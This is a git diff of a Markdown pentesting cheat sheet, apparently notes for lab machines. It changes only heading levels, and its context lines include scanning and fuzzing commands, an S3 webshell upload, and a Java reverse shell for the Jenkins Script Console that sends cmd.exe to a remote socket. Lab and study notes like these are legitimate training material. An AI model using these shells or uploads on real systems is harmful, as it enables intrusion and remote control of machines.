@@ -46,7 +46,7 @@ toc: true
 
 # Enumeration :
 
-### Scanning :
+## Scanning :
 
 ```bash
 nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN Open_Ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN Nmap_sV_sC_Results.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN Nmap_Vuln_Results.txt 
@@ -65,7 +65,7 @@ ftp> passive off
 This will fix it . 
 ```
 
-### Services :
+## Services :
 
 **FTP :** 
 
@@ -86,7 +86,7 @@ This will fix it .
 
 # Web Application :
 
-### Crawling :
+## Crawling :
 
 ```bash
 burpsuite : it will automatically crawl all the application for us 
@@ -94,7 +94,7 @@ burpsuite : it will automatically crawl all the application for us
 Target / Site map . 
 ```
 
-### subdomains + directories :
+## subdomains + directories :
 
 ```java
 gobuster -w wordlist -u https://IP -K -x txt,html,php...
@@ -115,7 +115,7 @@ gobuster dir -u http://10.129.85.12 -w /usr/share/wordlists/seclists/Discovery/W
 ffuf -u http://conversor.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
 ```
 
-### AWS Commands :
+## AWS Commands :
 
 > In case we found AWS S3 buckets , we can interact with them .
 > 
@@ -132,7 +132,7 @@ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb : List content
 aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb : File upload
 ```
 
-### Jenkins Rev Shell :
+## Jenkins Rev Shell :
 
 ```bash
 Go to Script Console : 
@@ -143,7 +143,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-### Wordpress :
+## Wordpress :
 
 Enumeration : 
 
@@ -185,21 +185,21 @@ select * from wp_users ;
 Always check the SSH Keys for easy access . 
 ```
 
-### Command Injection :
+## Command Injection :
 
 ```bash
 https://github.com/payloadbox/command-injection-payload-list
 Use this whenever we have a parametere that gets used with a command . 
 ```
 
-### File Upload :
+## File Upload :
 
 ```bash
 Always check for Extensions that are allowed , try php5 , phtml , ... 
 /usr/share/webshells/ : Then check the one for the Technology used . 
 ```
 
-### SQL Injection :
+## SQL Injection :
 
 ```bash
 # Via GraphQL : 
@@ -235,7 +235,7 @@ those numbers with our DB query .
 Now we just navigae to IP:80/Shell.php?exec=command : to execute the commands .   
 ```
 
-### LFI / RFI :
+## LFI / RFI :
 
 **Testing For LFI :** 
 
@@ -1271,7 +1271,7 @@ get-process -id 4 | Select-object * : Return info about who's running it .
 icacls.exe Executable : to see who's running the executable . 
 ```
 
-## Quick Wins :
+### Quick Wins :
 
 ```bash
 # Check for unquoted services : 
